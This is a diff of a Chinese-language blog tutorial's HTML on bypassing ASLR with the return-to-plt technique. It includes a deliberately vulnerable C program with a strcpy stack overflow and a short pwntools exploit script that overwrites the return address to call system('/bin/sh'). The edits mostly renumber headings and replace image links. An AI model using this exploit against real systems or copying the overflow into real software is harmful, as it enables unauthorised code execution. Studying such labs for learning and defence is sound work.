@@ -202,8 +202,7 @@
       
     <div class="article-entry" itemprop="articleBody">
        
-  <h1><span id="二进制保护机制原理和绕过技巧">二进制保护机制原理和绕过技巧</span></h1><p>[toc]</p>
-<h2><span id="0x00-工具">0x00 工具</span></h2><ul>
+  <h1><span id="二进制保护机制原理和绕过技巧">二进制保护机制原理和绕过技巧</span></h1><h2><span id="0x00-工具">0x00 工具</span></h2><ul>
 <li><strong>peda</strong></li>
 </ul>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/longld/peda.git ~/peda</span><br><span class="line">echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure>
@@ -217,14 +216,15 @@
 
 
 <h2><span id="0x01-aslr">0x01 ASLR</span></h2><p>ASLR（地址空间布局随机化）的原理不作详细介绍，它可以将进程内的某些内存地址进行随机化来加大入侵难度。因此我们很难直接通过ret2libc成功利用漏洞。</p>
-<h3><span id="1-绕过aslr核心点">1. 绕过ASLR核心点</span></h3><ul>
+<p><strong>绕过ASLR核心点</strong> </p>
+<ul>
 <li>开启ASLR后，libc的<strong>基地址会变</strong>，但是<strong>函数的偏移量不会变</strong></li>
 <li>system 函数地址 &#x3D; libc基地址 + 函数偏移量</li>
 </ul>
-<p><img src="C:\Users\Ryan\AppData\Roaming\Typora\typora-user-images\image-20240321222858287.png" alt="image-20240321222858287"></p>
-<p><img src="C:\Users\Ryan\AppData\Roaming\Typora\typora-user-images\image-20240321222637434.png" alt="image-20240321222637434"></p>
-<h3><span id="2-return-to-plt技术">2. return-to-plt技术</span></h3><h4><span id="21-背景知识">2.1 背景知识</span></h4><p>在介绍这一技术前，先了解一下Linux内存布局、静态函数库和动态函数库（共享函数库）的区别以及PIC。</p>
-<h5><span id="211-linux内存布局">2.1.1 Linux内存布局</span></h5><p><img src="C:\Users\Ryan\AppData\Roaming\Typora\typora-user-images\image-20240321224452523.png" alt="image-20240321224452523"></p>
+<p><img src="https://pic.imgdb.cn/item/65fc5d2f9f345e8d03706af0.png"></p>
+<p><img src="https://pic.imgdb.cn/item/65fc5d309f345e8d03706da2.png"></p>
+<h2><span id="0x02-return-to-plt技术">0x02 return-to-plt技术</span></h2><h4><span id="21-背景知识">2.1 背景知识</span></h4><p>在介绍这一技术前，先了解一下Linux内存布局、静态函数库和动态函数库（共享函数库）的区别以及PIC。</p>
+<h5><span id="211-linux内存布局">2.1.1 Linux内存布局</span></h5><p><img src="https://pic.imgdb.cn/item/65fc5d309f345e8d03706c09.png"></p>
 <ul>
 <li>.text 汇编代码</li>
 <li>.data 无初始值的数据（静态变量，全局变量）</li>
@@ -250,7 +250,7 @@
 <li>存根代码会从GOT(GOT[n])里获取地址并跳转</li>
 </ul>
 <p><strong>两层间接寻址：function@PLT -&gt; GOT(GOT(n)) -&gt; function addr</strong></p>
-<h2><span id="0x02-漏洞利用">0x02 漏洞利用</span></h2><h3><span id="1-漏洞代码">1. 漏洞代码</span></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span> </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">shell</span><span class="params">()</span> &#123;      <span class="comment">//这个函数在啊程序中并没有直接执行，但是为了后续的寻找plt进行漏洞利用，需要编译它</span></span><br><span class="line"></span><br><span class="line"> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"> <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line"> <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line"> <span class="type">char</span> buf[<span class="number">256</span>];</span><br><span class="line"> <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]);</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buf);</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2><span id="0x03-漏洞利用">0x03 漏洞利用</span></h2><h3><span id="1-漏洞代码">1. 漏洞代码</span></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span> </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">shell</span><span class="params">()</span> &#123;      <span class="comment">//这个函数在啊程序中并没有直接执行，但是为了后续的寻找plt进行漏洞利用，需要编译它</span></span><br><span class="line"></span><br><span class="line"> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"> <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line"> <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line"> <span class="type">char</span> buf[<span class="number">256</span>];</span><br><span class="line"> <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]);</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buf);</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 
 
@@ -269,12 +269,12 @@
 
 
 
-<h3><span id="4-exp">4. EXP</span></h3><p>exp的构造，首先向缓冲区中填充256个字节的‘A’+向对齐空间中填充16字节的‘A’+ system@PLT的地址+exit@PLT的地址+system_arg的地址。</p>
+<h3><span id="4-exp">4. EXP</span></h3><p>exp的构造，首先向缓冲区中填充256个字节的‘A’ + 向对齐空间中填充16字节的‘A’ + system@PLT的地址 + exit@PLT的地址 + system_arg的地址。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">system = <span class="number">0x1050</span></span><br><span class="line">exit = <span class="number">0x1060</span></span><br><span class="line">system_arg = <span class="number">0x559e0dd67004</span></span><br><span class="line">payload=<span class="string">&quot;A&quot;</span> * <span class="number">272</span>+p32(system)+p32(exit)+p32(system_arg)</span><br><span class="line"><span class="built_in">print</span> payload</span><br><span class="line">io= process(argv=[<span class="string">&#x27;./vuln&#x27;</span>, payload])</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
 
 
-<h2><span id="参考">参考</span></h2><p>[1] <a target="_blank" rel="noopener" href="https://gxkyrftx.github.io/2019/03/02/%E7%BB%95%E8%BF%87ASLR-%E4%B8%80/">绕过ASLR-一</a></p>
+<h2><span id="0x04-参考">0x04 参考</span></h2><p>[1] <a target="_blank" rel="noopener" href="https://gxkyrftx.github.io/2019/03/02/%E7%BB%95%E8%BF%87ASLR-%E4%B8%80/">绕过ASLR-一</a></p>
 <p>[2] <a target="_blank" rel="noopener" href="https://lantern.cool/note-pwn-linux-protect/index.html">Linux常用保护机制</a></p>
 <p>[3] <a target="_blank" rel="noopener" href="https://darkwing.moe/2019/02/21/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02-%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80/">Pwn学习笔记2-内存布局</a></p>
 <p>[4] <a target="_blank" rel="noopener" href="https://diting0x.github.io/20170101/bypassaslr-returntoplt/">bypassaslr-returntoplt</a></p>
